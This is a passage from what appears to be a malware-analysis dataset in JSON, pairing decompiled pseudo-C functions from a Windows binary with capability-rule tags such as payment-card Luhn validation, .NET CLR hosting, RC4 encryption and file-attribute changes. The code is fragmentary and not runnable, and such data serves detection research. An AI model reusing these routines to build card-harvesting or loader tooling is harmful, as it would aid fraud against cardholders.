uVar3 = *(var_ch + 0xc);\n                    uVar5 = 0;\n                    fcn.00409e4c(uVar3);\n                    fcn.004058e0(var_2ch, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x468e08;\n                    uVar3 = *(var_ch + 0x10);\n                    uVar5 = 0;\n                    fcn.00409e4c(uVar3);\n                    fcn.004058e0(var_30h, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x468e08;\n                    uVar3 = *(var_ch + 0x14);\n                    uVar5 = 0;\n                    fcn.00409e4c(uVar3);\n                    fcn.004058e0(var_34h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x468e08, *in_EAX);\n                    fcn.004058e0(var_38h);\n                    fcn.00405728(0x468e08, *in_EAX);\n                    fcn.004058e0(var_3ch);\n                    fcn.00409e4c(*(var_ch + 0x20));\n                    iStack72 = 0x468e14;\n                    fcn.004058e0();\n                }\n                iStack76 = var_ch;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = iStack76;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        var_3ch = var_8h;\n        iStack72 = 0x468dd5;\n        sub.netapi32.dll_NetApiBufferFree();\n    }\n    *in_FS_OFFSET = var_3ch;\n    var_34h = 0x468df7;\n    var_38h = 0x468def;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1382
    },
    "00468e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00468e64(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x468e7d;\n    fcn.004059cc();\n    puStack28 = 0x468e85;\n    fcn.004059cc();\n    uStack32 = 0x468f14;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421644();\n    piVar1 = fcn.00404620();\n    fcn.00409ecc();\n    fcn.00468e18();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421d58();\n    (**(*piVar1 + 0x1c))();\n    fcn.004216f0();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x468f1b;\n    uStack32 = 0x468f13;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 301
    },
    "00469304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469304(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46931b;\n    fcn.004059cc();\n    puStack24 = 0x469323;\n    fcn.004059cc();\n    puStack24 = 0x46932b;\n    fcn.004059cc();\n    puStack24 = 0x469333;\n    fcn.004059cc();\n    uStack28 = 0x4693df;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46934d;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421644();\n    puStack36 = 0x469358;\n    fcn.00409ecc();\n    puStack36 = 0x46935d;\n    fcn.00468e18();\n    uStack40 = 0x4693b5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00409ecc();\n    fcn.00422060();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4693bc;\n    uStack40 = 0x4693ac;\n    fcn.004216f0();\n    uStack40 = 0x4693b4;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 425
    },
    "004693ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004693ec(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x469403;\n    fcn.004059cc();\n    puStack24 = 0x46940b;\n    fcn.004059cc();\n    puStack24 = 0x469413;\n    fcn.004059cc();\n    puStack24 = 0x46941b;\n    fcn.004059cc();\n    uStack28 = 0x4694c0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x469435;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421644();\n    puStack36 = 0x469440;\n    fcn.00409ecc();\n    puStack36 = 0x469445;\n    fcn.00468e18();\n    uStack40 = 0x469496;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421fb8();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46949d;\n    uStack40 = 0x46948d;\n    fcn.004216f0();\n    uStack40 = 0x469495;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 413
    },
    "004694d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004694d0(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4694e7;\n    fcn.004059cc();\n    puStack24 = 0x4694ef;\n    fcn.004059cc();\n    puStack24 = 0x4694f7;\n    fcn.004059cc();\n    puStack24 = 0x4694ff;\n    fcn.004059cc();\n    uStack28 = 0x4695a4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x469519;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.00421644();\n    puStack36 = 0x469524;\n    fcn.00409ecc();\n    puStack36 = 0x469529;\n    fcn.00468e18();\n    uStack40 = 0x46957a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421f88();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x469581;\n    uStack40 = 0x469571;\n    fcn.004216f0();\n    uStack40 = 0x469579;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 417
    },
    "0046a37c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046a37c(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46a395;\n    fcn.004059cc();\n    puStack28 = 0x46a39d;\n    fcn.004059cc();\n    puStack28 = 0x46a3a5;\n    fcn.004059cc();\n    uStack32 = 0x46a42e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00421644();\n    bVar1 = true;\n    fcn.00405974();\n    if (!bVar1) {\n        fcn.00405974();\n    }\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421cd0();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46a435;\n    uStack32 = 0x46a42d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 295
    },
    "0046abf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.0046abf0(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x46ac0a;\n    fcn.004059cc();\n    var_10h = 0x46ad25;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046abf0::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea34(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_8h, 0x46ad30, var_ch);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x46ad2c);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 598
    },
    "0046ad3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.0046ad3c(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x46ad56;\n    fcn.004059cc();\n    var_10h = 0x46ae6f;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046ad3c::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea34(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x46ae7c, 0xffffffff);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x46ae76);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 597
    },
    "0046ae88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.0046ae88(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x46aea2;\n    fcn.004059cc();\n    var_10h = 0x46afbb;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046ae88::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045ea34(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045ea34(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x46afc8, 0);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x46afc2);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 592
    },
    "0046b710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046b710(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46b72a;\n    fcn.004059cc();\n    uStack28 = 0x46b79e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00405864();\n    fcn.00421864();\n    fcn.00421fe8();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46b7a5;\n    uStack28 = 0x46b79d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 219
    },
    "0046cde0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cde0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46cdf9;\n    fcn.004059cc();\n    uStack24 = 0x46ce3c;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040a590(param_2);\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack28 = 0x46ce43;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 205
    },
    "0046ddb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046ddb8(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.004057a0();\n    }\n    else {\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0046e1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0046e1ec(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int16_t iVar3;\n    \n    iVar1 = *(in_EAX + 0x3c);\n    uVar2 = fcn.00402f00();\n    fcn.00403af4();\n    fcn.00408550();\n    iVar3 = *(iVar1 + in_EAX + 6);\n    do {\n        fcn.00408550();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return CONCAT44(in_EAX, uVar2);\n}\n",
        "token_count": 146
    },
    "0046f6f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0046f6f8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = *(in_EAX + 0x28) * 2;\n    *(*(in_EAX + 0x40) + -2 + *(in_EAX + 0x48) * 2) = 0;\n    fcn.0046e618(*(in_EAX + 0x40), 0, (*(in_EAX + 0x48) + -1) * 2);\n    *(in_EAX + 0x7c) = *(*(in_EAX + 0x80) * 0xc + 0x490b7a);\n    *(in_EAX + 0x88) = *(*(in_EAX + 0x80) * 0xc + 0x490b78);\n    *(in_EAX + 0x8c) = *(*(in_EAX + 0x80) * 0xc + 0x490b7c);\n    *(in_EAX + 0x78) = *(*(in_EAX + 0x80) * 0xc + 0x490b7e);\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x70) = 0;\n    *(in_EAX + 0x74) = 2;\n    *(in_EAX + 0x5c) = 2;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 375
    },
    "004721fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004721fc(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    puVar1 = in_EAX + 0x90;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x11e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x984;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x1e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0xa78;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x13);\n    *(in_EAX + 0x490) = 1;\n    *(in_EAX + 0x16a8) = 0;\n    *(in_EAX + 0x16a4) = 0;\n    *(in_EAX + 0x16ac) = 0;\n    *(in_EAX + 0x169c) = 0;\n    return;\n}\n",
        "token_count": 322
    },
    "00472268": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472268(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iStack24;\n    \n    iVar5 = *(in_EAX + 0xb58 + param_1 * 4);\n    puVar1 = param_2 + iVar5 * 4;\n    iStack24 = param_1;\n    while (iVar7 = iStack24 * 2,  iVar7 <= *(in_EAX + 0x144c)) {\n        if ((iVar7 < *(in_EAX + 0x144c)) &&\n           ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) < *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) ||\n            ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) == *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) &&\n             (uVar3 = *(in_EAX + 0x1454 + *(in_EAX + 0xb5c + iStack24 * 8)), \n             puVar2 = in_EAX + 0x1454 + *(in_EAX + 0xb58 + iStack24 * 8),  uVar3 < *puVar2 || uVar3 == *puVar2)))))) {\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = *(param_2 + *(in_EAX + 0xb58 + iVar7 * 4) * 4);\n        if ((*puVar1 <= uVar4 && uVar4 != *puVar1) ||\n           ((iVar6 = *(in_EAX + 0xb58 + iVar7 * 4),  *(param_2 + iVar6 * 4) == *puVar1 &&\n            (uVar3 = *(in_EAX + 0x1454 + iVar5),  puVar2 = in_EAX + 0x1454 + iVar6,  uVar3 < *puVar2 || uVar3 == *puVar2\n            )))) break;\n        *(in_EAX + 0xb58 + iStack24 * 4) = *(in_EAX + 0xb58 + iVar7 * 4);\n        iStack24 = iVar7;\n    }\n    *(in_EAX + 0xb58 + iStack24 * 4) = iVar5;\n    return;\n}\n",
        "token_count": 627
    },
    "0047255c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047255c(int16_t *param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint16_t *puVar4;\n    int16_t iVar5;\n    int16_t aiStack44 [16];\n    \n    iVar5 = 0;\n    iVar2 = 1;\n    piVar3 = aiStack44;\n    do {\n        piVar3 = piVar3 + 1;\n        iVar5 = (*param_1 + iVar5) * 2;\n        *piVar3 = iVar5;\n        iVar2 = iVar2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar2 < 0x10);\n    iVar2 = 0;\n    puVar4 = in_EAX + 2;\n    if (-1 < param_2) {\n        do {\n            if (*puVar4 != 0) {\n                aiStack44[*puVar4] = aiStack44[*puVar4] + 1;\n                uVar1 = fcn.00473e38();\n                puVar4[-1] = uVar1;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 2;\n        } while (iVar2 <= param_2);\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "0047f1ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047f1ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack408;\n    uint uStack404;\n    uchar *puStack400;\n    uint uStack396;\n    uint uStack392;\n    uchar *puStack388;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_4h;\n    \n    puStack400 = &stack0xfffffffc;\n    puStack388 = 0x47f1c3;\n    fcn.004059cc();\n    puStack388 = 0x47f1d4;\n    fcn.00405fe8();\n    uStack392 = 0x47f2a3;\n    uStack396 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe74;\n    uStack404 = 0x47f25e;\n    uStack408 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe68;\n    puStack388 = &stack0xfffffffc;\n    fcn.0040a478();\n    fcn.0040a4ec();\n    *in_FS_OFFSET = uStack408;\n    *in_FS_OFFSET = uStack396;\n    puStack388 = 0x47f2aa;\n    uStack392 = 0x47f29a;\n    fcn.004060ac();\n    uStack392 = 0x47f2a2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 340
    },
    "0047f760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047f760(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x47f813;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar2 = (**(**(in_EAX + 0x40) + 0x14))();\n    if ((0 < iVar2) && (iVar2 = (**(**(in_EAX + 0x40) + 0x14))(),  -1 < iVar2 + -1)) {\n        do {\n            (**(**(in_EAX + 0x40) + 0xc))();\n            cVar1 = fcn.0040a25c();\n            if (cVar1 != '\\0') {\n                fcn.0047f1ac();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x47f81a;\n    uStack56 = 0x47f812;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 340
    },
    "0047ff14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047ff14(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_16ch;\n    uint var_168h;\n    uint var_154h;\n    uint var_4h;\n    \n    puStack396 = &stack0xfffffffc;\n    puStack384 = 0x47ff35;\n    fcn.004059cc();\n    puStack384 = 0x47ff46;\n    fcn.00405fe8();\n    uStack388 = 0x480013;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    uStack400 = 0x47ffd0;\n    uStack404 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe6c;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405864();\n    iVar1 = fcn.0040a478();\n    while (iVar1 == 0) {\n        uStack404 = 0x48003c;\n        fcn.004058e0();\n        iVar1 = fcn.0040a4c8();\n    }\n    fcn.0040a4ec();\n    *in_FS_OFFSET = uStack404;\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x48001a;\n    uStack388 = 0x47fff9;\n    fcn.00405530();\n    uStack388 = 0x48000a;\n    fcn.004060ac();\n    uStack388 = 0x480012;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 398
    },
    "00481398": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00481398 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x4814cd;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b730();\n    if (_var_18h == *0x4814e8) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x4814ec;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x4814f0;\n    } while (*0x4814e8 < _var_18h);\n    fcn.0048b4bc();\n    fcn.00405864();\n    fcn.00474d1c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 429
    },
    "0048183c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048183c noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack52 = 0x481971;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00405728();\n    fcn.00405b28(&var_1ch);\n    fcn.00405a44();\n    fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    _var_18h = fcn.0040b730();\n    if (_var_18h == *0x48198c) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x481990;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread_1();\n        _var_18h = _var_18h - *0x481994;\n    } while (*0x48198c < _var_18h);\n    fcn.0048b4bc();\n    fcn.00405864();\n    fcn.00474d1c();\n    // WARNING: Subroutine does not return\n    